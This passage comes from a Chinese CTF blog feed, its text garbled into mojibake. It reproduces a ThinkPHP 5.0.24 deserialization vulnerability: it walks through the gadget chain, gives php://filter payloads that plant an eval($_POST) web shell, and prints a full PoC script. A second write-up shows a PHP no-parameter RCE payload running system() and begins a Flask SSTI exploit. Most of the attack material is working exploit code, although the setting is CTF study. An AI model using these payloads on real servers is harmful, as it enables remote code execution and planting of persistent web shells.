class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeln</span>(<span class="params"><span class="variable">$messages</span>, <span class="variable">$type</span> = <span class="built_in">self</span>::OUTPUT_NORMAL</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;write(<span class="variable">$messages</span>, <span class="literal">true</span>, <span class="variable">$type</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¨å±€å¯»æ‰¾write()å‡½æ•°ï¼Œé€‰æ‹©<code>/thinkphp/library/think/session/driver/Memcache.php</code>ä¸­çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$sessID</span>, <span class="variable">$sessData</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;handler-&gt;set(<span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;session_name&#x27;</span>] . <span class="variable">$sessID</span>, <span class="variable">$sessData</span>, <span class="number">0</span>, <span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;expire&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$this-&gt;handlerå¯æ§ï¼Œå…¨å±€å¯»æ‰¾å«æœ‰set()å‡½æ•°çš„ç±»ï¼Œé€‰æ‹©<code>thinkphp/think/cache/driver/File.php</code>ä¸­çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="variable">$expire</span>)) &#123;</span><br><span class="line">        <span class="variable">$expire</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$expire</span> <span class="keyword">instanceof</span> \DateTime) &#123;</span><br><span class="line">        <span class="variable">$expire</span> = <span class="variable">$expire</span>-&gt;getTimestamp() - time();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="keyword">$this</span>-&gt;getCacheKey(<span class="variable">$name</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;tag &amp;&amp; !is_file(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="variable">$first</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$data</span> = serialize(<span class="variable">$value</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">//æ•°æ®å‹ç¼©</span></span><br><span class="line">        <span class="variable">$data</span> = gzcompress(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$data</span>   = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line">    <span class="variable">$result</span> = file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">        <span class="keyword">isset</span>(<span class="variable">$first</span>) &amp;&amp; <span class="keyword">$this</span>-&gt;setTagItem(<span class="variable">$filename</span>);</span><br><span class="line">        clearstatcache();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>set()å‡½æ•°ä¸­è°ƒç”¨äº†file_put_contents()æ¥è¿›è¡Œæ–‡ä»¶å†™å…¥ï¼Œå†™å…¥å†…å®¹ä¸º$dataï¼Œ$dataæ¥è‡ªäº$valueï¼Œè€Œ$valueå®é™…ä¸Šæ˜¯writln()ä¸­çš„trueï¼Œä¸å¯æ§</p><p>è¿™é‡Œè·Ÿè¿›setTagItem()å‡½æ•°ï¼Œåœ¨è¯¥å‡½æ•°ä¸­ï¼Œä»¥$nameä½œä¸º$valueåˆè°ƒç”¨äº†ä¸€æ¬¡set()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">setTagItem</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;tag) &#123;</span><br><span class="line">        <span class="variable">$key</span>       = <span class="string">&#x27;tag_&#x27;</span> . md5(<span class="keyword">$this</span>-&gt;tag);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tag = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;has(<span class="variable">$key</span>)) &#123;</span><br><span class="line">            <span class="variable">$value</span>   = explode(<span class="string">&#x27;,&#x27;</span>, <span class="keyword">$this</span>-&gt;get(<span class="variable">$key</span>));</span><br><span class="line">            <span class="variable">$value</span>[] = <span class="variable">$name</span>;</span><br><span class="line">            <span class="variable">$value</span>   = implode(<span class="string">&#x27;,&#x27;</span>, array_unique(<span class="variable">$value</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable">$name</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;set(<span class="variable">$key</span>, <span class="variable">$value</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›getCacheKey()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$auto</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$name</span> = md5(<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;cache_subdir&#x27;</span>]) &#123;</span><br><span class="line">        <span class="comment">// ä½¿ç”¨å­ç›®å½•</span></span><br><span class="line">        <span class="variable">$name</span> = substr(<span class="variable">$name</span>, <span class="number">0</span>, <span class="number">2</span>) . DS . substr(<span class="variable">$name</span>, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . DS . <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;path&#x27;</span>] . <span class="variable">$name</span> . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$dir</span>      = dirname(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$auto</span> &amp;&amp; !is_dir(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">        mkdir(<span class="variable">$dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$this-&gt;options[â€˜pathâ€™]æ˜¯å¯æ§çš„ï¼Œå¯é€šè¿‡phpä¼ªåè®®ç»•è¿‡$dataä¸­çš„exit()</p><p>windowsä¸‹payloadï¼š<code>$this-&gt;options[&#39;path&#39;]=php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php</code></p><p>linuxä¸‹payloadï¼š<code>$this-&gt;options[&#39;path&#39;]=php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();riny($_CBFG[pzq]);?&gt;</code></p><h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = [<span class="keyword">new</span> Pivot()];<span class="comment">//è§¦å‘Model __toString(),å­ç±»Pivotåˆé€‚</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;<span class="comment">#Relation</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Query</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Relation</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;selfRelation = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;query = <span class="keyword">new</span> Query();<span class="comment">#class Query</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>;<span class="comment">#OneToOne HasOne</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Relation</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">OneToOne</span> <span class="keyword">extends</span> <span class="title">Relation</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::__construct();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HasOne</span> <span class="keyword">extends</span> <span class="title">OneToOne</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::__construct();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;bindAttr = [<span class="string">&quot;no&quot;</span>,<span class="string">&quot;123&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>;<span class="comment">#Output</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Output</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$styles</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Memcached();<span class="comment">//ç›®çš„è°ƒç”¨å…¶write()</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;styles = [<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;<span class="comment">#Model</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>\<span class="title">HasOne</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Query</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$error</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$parent</span>;<span class="comment">#ä¿®æ”¹å¤„</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$aaaaa</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;parent = <span class="keyword">new</span> Output();<span class="comment">#Outputå¯¹è±¡,ç›®çš„æ˜¯è°ƒç”¨__call()</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">&#x27;getError&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error = <span class="keyword">new</span> HasOne();<span class="comment">//Relationå­ç±»,ä¸”æœ‰getBindAttr()</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;selfRelation = <span class="literal">false</span>;<span class="comment">//isSelfRelation()</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;query = <span class="keyword">new</span> Query();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">db</span>;<span class="comment">#Query</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Query</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$model</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;model = <span class="keyword">new</span> Output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>;<span class="comment">#Memcached</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcached</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$handler</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handler = <span class="keyword">new</span> File();<span class="comment">//ç›®çš„è°ƒç”¨File-&gt;set()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>;<span class="comment">#File</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options = [</span><br><span class="line">            <span class="string">&#x27;expire&#x27;</span>        =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">&#x27;cache_subdir&#x27;</span>  =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;prefix&#x27;</span>        =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>          =&gt; <span class="string">&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tag = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Windows()));</span><br></pre></td></tr></table></figure><p>å°†pocå¾—åˆ°çš„ç»“æœä½œä¸ºå˜é‡cä¼ å…¥ï¼Œä¼šåœ¨/publicç›®å½•ä¸‹ç”Ÿæˆä¸‰ä¸ªæ–‡ä»¶</p><p>æœ‰shellçš„æ–‡ä»¶åç§°ä¸º<code>&#39;a.php&#39;.md5(&#39;tag_&#39;.md5($this-&gt;tag)).&#39;.php&#39;</code>ï¼Œè®¿é—®å³å¯</p><p><img src="/2022/01/16/thinkphp5-0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20220117144927846.png" alt="image-20220117144927846"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æ¯”èµ›é‡åˆ°çš„ä¸€ä¸ªthinkphpæ¡†æ¶çš„è€ƒç‚¹ï¼Œåœ¨ç½‘ä¸Šæ‰¾åˆ°ä¸€äº›å¤§ä½¬çš„æ–‡ç« ï¼ŒæŠŠæ¼æ´å¤ç°ä¸€ä¸‹ï¼Œæ•´ä¸ªæ¼æ´åˆ©ç”¨çš„æµç¨‹èµ°ä¸€é&lt;/p&gt;
&lt;h1 id=&quot;å¤ç°ç¯</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>é•¿å®‰æˆ˜ç–«Webéƒ¨åˆ†</title>
    <link href="https://wuyusanhua2021.github.io/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/"/>
    <id>https://wuyusanhua2021.github.io/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/</id>
    <published>2022-01-12T11:54:37.000Z</published>
    <updated>2022-01-15T04:06:30.326Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RCE-No-Para"><a href="#RCE-No-Para" class="headerlink" title="RCE_No_Para"></a>RCE_No_Para</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/session|end|next|header|dir/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>phpæ— å‚æ•°rceï¼Œè¿‡æ»¤äº†ä¸€äº›å¸¸ç”¨çš„å‡½æ•°ï¼Œæƒ³åŠæ³•ç»•è¿‡å³å¯</p><p>payload:<code>code=eval(array_rand(array_flip(current(array_values(get_defined_vars())))));&amp;a=system(&#39;cat flag.php&#39;);</code></p><p><a href="https://www.freebuf.com/articles/network/242482.html">æ— å‚æ•°è¯»æ–‡ä»¶å’ŒRCEæ€»ç»“</a></p><h1 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h1><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220112133745936.png" alt="image-20220112133745936"></p><p>æç¤ºè½¬å»<code>/admin</code>è·¯ç”±ï¼Œè½¬åˆ°<code>/admin?static.js?</code>ï¼ŒæˆåŠŸç™»å½•ï¼Œæ ¹æ®æç¤ºæ˜¯ç”¨nameæ¥ssti</p><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220112135750755.png" alt="image-20220112135750755"></p><p>åŒä¸‹åˆ’çº¿<code>__</code>è¢«è¿‡æ»¤ï¼Œå‚è€ƒå¤§ä½¬çš„exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://0932a3a1.lxctf.net&#x27;</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;name1&#x27;</span>:<span class="string">&#x27;__class__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name2&#x27;</span>: <span class="string">&#x27;__base__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name3&#x27;</span>: <span class="string">&#x27;__subclasses__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name4&#x27;</span>: <span class="string">&#x27;pop&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name5&#x27;</span>: <span class="string">&#x27;__init__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name6&#x27;</span>: <span class="string">&#x27;__globals__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name7&#x27;</span>: <span class="string">&#x27;__builtins__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name8&#x27;</span>: <span class="string">&#x27;open&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name9&#x27;</span>: <span class="string">&#x27;/flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name10&#x27;</span>: <span class="string">&#x27;read&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">payload=<span 